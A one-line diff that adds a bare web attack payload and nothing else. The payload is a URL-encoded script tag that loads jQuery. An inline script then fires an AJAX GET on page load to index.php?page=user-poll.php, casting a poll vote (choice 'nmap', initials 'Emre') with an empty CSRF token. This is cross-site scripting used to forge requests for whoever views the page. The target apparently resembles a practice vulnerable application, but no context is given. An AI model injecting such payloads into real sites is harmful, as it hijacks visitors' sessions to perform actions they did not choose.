@@ -1,0 +1,1 @@
+<script%20src="http://code.jquery.com/jquery-1.9.1.js"></script><script>$(document).ready(function(){$.ajax({type:"GET",url:"index.php?page=user-poll.php%26choice=nmap%26initials=Emre%26csrf-token=%26user-poll-php-submit-button%26=Submit+Vote",data:{},});});</script>
